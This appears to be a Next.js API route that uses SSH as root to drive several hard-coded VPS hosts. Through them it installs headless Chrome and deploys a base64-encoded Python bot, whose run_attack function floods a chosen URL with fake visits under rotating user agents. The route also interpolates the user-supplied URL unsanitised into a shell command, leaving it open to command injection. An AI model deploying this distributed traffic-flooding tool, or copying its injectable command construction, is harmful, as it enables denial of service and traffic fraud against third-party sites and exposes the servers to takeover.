import { NextResponse } from 'next/server';
import { Client } from 'ssh2';

const DEFAULT_SERVERS = [
  { host: '138.68.153.135', username: 'root' },
  { host: '188.166.159.196', username: 'root' },
  { host: '46.101.78.167', username: 'root' }
];

const PYTHON_SCRIPT_B64 = "ZnJvbSBEcmlzc2lvblBhZ2UgaW1wb3J0IENocm9taXVtUGFnZSwgQ2hyb21pdW1PcHRpb25zCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHJhbmRvbQppbXBvcnQgdGhyZWFkaW5nCgp2aXNpdF9jb3VudCA9IDAKbG9jayA9IHRocmVhZGluZy5Mb2NrKCkKCmRlZiBjcmVhdGVfYnJvd3NlcigpOgogICAgY28gPSBDaHJvbWl1bU9wdGlvbnMoKQogICAgY28uc2V0X2FyZ3VtZW50KCctLWhlYWRsZXNzPW5ldycpCiAgICBjby5zZXRfYXJndW1lbnQoJy0tbm8tc2FuZGJveCcpCiAgICBjby5zZXRfYXJndW1lbnQoJy0tZGlzYWJsZS1ncHUnKQogICAgY28uc2V0X2FyZ3VtZW50KCctLWRpc2FibGUtaW1hZ2VzJykKICAgIGNvLnNldF9hcmd1bWVudCgnLS1kaXNhYmxlLWphdmFzY3JpcHQnKQogICAgY28uc2V0X2FyZ3VtZW50KCctLWRpc2FibGUtZXh0ZW5zaW9ucycpCiAgICBjby5zZXRfYXJndW1lbnQoJy0tZGlzYWJsZS1kZXYtc2htLXVzYWdlJykKICAgIGFnZW50cyA9IFsKICAgICAgICAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2JywKICAgICAgICAnTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExOS4wLjAuMCBTYWZhcmkvNTM3LjM2JywKICAgICAgICAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTE4LjAuMC4wIFNhZmFyaS81MzcuMzYnLAogICAgICAgICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDkuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMTkuMCcsCiAgICAgICAgJ01vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTdfMCBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTcuMCBNb2JpbGUvMTVFMTQ4IFNhZmFyaS82MDQuMScsCiAgICBdCiAgICBjby5zZXRfdXNlcl9hZ2VudChyYW5kb20uY2hvaWNlKGFnZW50cykpCiAgICByZXR1cm4gQ2hyb21pdW1QYWdlKGFkZHJfb3Jfb3B0cz1jbykKCmRlZiB3b3JrZXIodGFyZ2V0X3VybCwgbWF4X3Zpc2l0cywgZW5kX3RpbWUsIGRlbGF5KToKICAgIGdsb2JhbCB2aXNpdF9jb3VudAogICAgdHJ5OgogICAgICAgIHBhZ2UgPSBjcmVhdGVfYnJvd3NlcigpCiAgICAgICAgd2hpbGUgdGltZS50aW1lKCkgPCBlbmRfdGltZToKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgaWYgdmlzaXRfY291bnQgPj0gbWF4X3Zpc2l0czoKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgdmlzaXRfY291bnQgKz0gMQogICAgICAgICAgICAgICAgY3VycmVudCA9IHZpc2l0X2NvdW50CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHRhYiA9IHBhZ2UubmV3X3RhYih0YXJnZXRfdXJsKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChkZWxheSkKICAgICAgICAgICAgICAgIHRhYi5jbG9zZSgpCiAgICAgICAgICAgICAgICBpZiBjdXJyZW50ICUgMTAwID09IDA6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJQcm9ncmVzczoge2N1cnJlbnR9L3ttYXhfdmlzaXRzfSB2aXNpdHMiKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDAuNSkKICAgICAgICBwYWdlLnF1aXQoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiV29ya2VyIGVycm9yOiB7ZX0iKQoKZGVmIHJ1bl9hdHRhY2sodGFyZ2V0X3VybCwgbWF4X3Zpc2l0b3JzPTEwMCwgZHVyYXRpb25fbWludXRlcz01KToKICAgIGdsb2JhbCB2aXNpdF9jb3VudAogICAgdmlzaXRfY291bnQgPSAwCgogICAgdG90YWxfc2Vjb25kcyA9IGR1cmF0aW9uX21pbnV0ZXMgKiA2MAogICAgdmlzaXRzX3Blcl9zZWNvbmRfbmVlZGVkID0gbWF4X3Zpc2l0b3JzIC8gdG90YWxfc2Vjb25kcwogICAgbnVtX3RocmVhZHMgPSBtYXgoMiwgbWluKGludCh2aXNpdHNfcGVyX3NlY29uZF9uZWVkZWQgLyAyKSArIDEsIDIwKSkKICAgIGRlbGF5ID0gbWF4KDAuMSwgKHRvdGFsX3NlY29uZHMgKiBudW1fdGhyZWFkcykgLyBtYXhfdmlzaXRvcnMpCgogICAgcHJpbnQoZiJTdGFydGluZzoge21heF92aXNpdG9yc30gdmlzaXRvcnMgaW4ge2R1cmF0aW9uX21pbnV0ZXN9IG1pbiB8IHtudW1fdGhyZWFkc30gdGhyZWFkcyB8IGRlbGF5OiB7ZGVsYXk6LjJmfXMiKQoKICAgIGVuZF90aW1lID0gdGltZS50aW1lKCkgKyB0b3RhbF9zZWNvbmRzCiAgICB0aHJlYWRzID0gW10KICAgIGZvciBpIGluIHJhbmdlKG51bV90aHJlYWRzKToKICAgICAgICB0ID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9d29ya2VyLCBhcmdzPSh0YXJnZXRfdXJsLCBtYXhfdmlzaXRvcnMsIGVuZF90aW1lLCBkZWxheSkpCiAgICAgICAgdC5kYWVtb24gPSBUcnVlCiAgICAgICAgdC5zdGFydCgpCiAgICAgICAgdGhyZWFkcy5hcHBlbmQodCkKICAgICAgICB0aW1lLnNsZWVwKDAuNSkKCiAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgIHQuam9pbigpCgogICAgcHJpbnQoZiJGaW5pc2hlZCEgVG90YWw6IHt2aXNpdF9jb3VudH0gdmlzaXRzIGluIHtkdXJhdGlvbl9taW51dGVzfSBtaW51dGVzIikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICB1cmwgPSBzeXMuYXJndlsxXSBpZiBsZW4oc3lzLmFyZ3YpID4gMSBlbHNlICJodHRwOi8vZXhhbXBsZS5jb20iCiAgICB2aXNpdG9ycyA9IGludChzeXMuYXJndlsyXSkgaWYgbGVuKHN5cy5hcmd2KSA+IDIgZWxzZSAxMDAKICAgIGR1cmF0aW9uID0gaW50KHN5cy5hcmd2WzNdKSBpZiBsZW4oc3lzLmFyZ3YpID4gMyBlbHNlIDUKICAgIHJ1bl9hdHRhY2sodXJsLCB2aXNpdG9ycywgZHVyYXRpb24pCg==";

const SETUP_COMMAND = 'apt update -y && apt upgrade -y && apt install -y python3 python3-pip wget gnupg2 libnss3 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 libasound2 fonts-liberation libappindicator3-1 xdg-utils && wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb && apt install -y ./google-chrome-stable_current_amd64.deb && rm -f google-chrome-stable_current_amd64.deb && pip3 install DrissionPage && echo "SETUP_COMPLETE"';

async function executeOnServer(server, command, timeout = 20000) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    const timer = setTimeout(() => {
      conn.end();
      reject(new Error('Connection timeout'));
    }, timeout);

    conn.on('ready', () => {
      clearTimeout(timer);
      conn.exec(command, (err, stream) => {
        if (err) {
          conn.end();
          return reject(err);
        }
        let output = '';
        stream.on('close', () => {
          conn.end();
          resolve(output);
        }).on('data', (data) => {
          output += data;
        }).stderr.on('data', (data) => {
          output += data;
        });
      });
    }).on('error', (err) => {
      clearTimeout(timer);
      reject(err);
    }).connect({
      host: server.host,
      port: 22,
      username: server.username,
      password: process.env.VPS_PASSWORD,
      readyTimeout: 20000,
    });
  });
}

export async function POST(req) {
  try {
    const { action, url, visitors, duration, servers } = await req.json();
    const serverList = (servers && servers.length > 0) ? servers : DEFAULT_SERVERS;
    const results = [];

    for (const server of serverList) {
      try {
        let command = '';
        let timeout = 20000;

        if (action === 'setup') {
          command = SETUP_COMMAND;
          timeout = 300000;
        } else if (action === 'deploy') {
          command = `echo "${PYTHON_SCRIPT_B64}" | base64 -d > /root/visit.py && echo "Script deployed successfully"`;
        } else if (action === 'start') {
          if (!url) throw new Error("URL is required");
          const v = visitors || 100;
          const d = duration || 5;
          command = `nohup python3 /root/visit.py "${url}" ${v} ${d} > /dev/null 2>&1 & echo "Started: ${v} visitors for ${d} minutes on ${url}"`;
        } else if (action === 'stop') {
          command = `pkill -f visit.py && echo "All processes stopped" || echo "No process found"`;
        } else {
          throw new Error("Unknown action");
        }

        const output = await executeOnServer(server, command, timeout);
        const isSuccess = action === 'setup' ? output.includes('SETUP_COMPLETE') : true;
        results.push({
          host: server.host,
          status: isSuccess ? 'success' : 'error',
          output: action === 'setup'
            ? (isSuccess ? 'Server setup completed successfully!' : 'Setup may have issues, check logs.')
            : output.trim()
        });
      } catch (error) {
        results.push({ host: server.host, status: 'error', error: error.message });
      }
    }

    return NextResponse.json({ results });
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
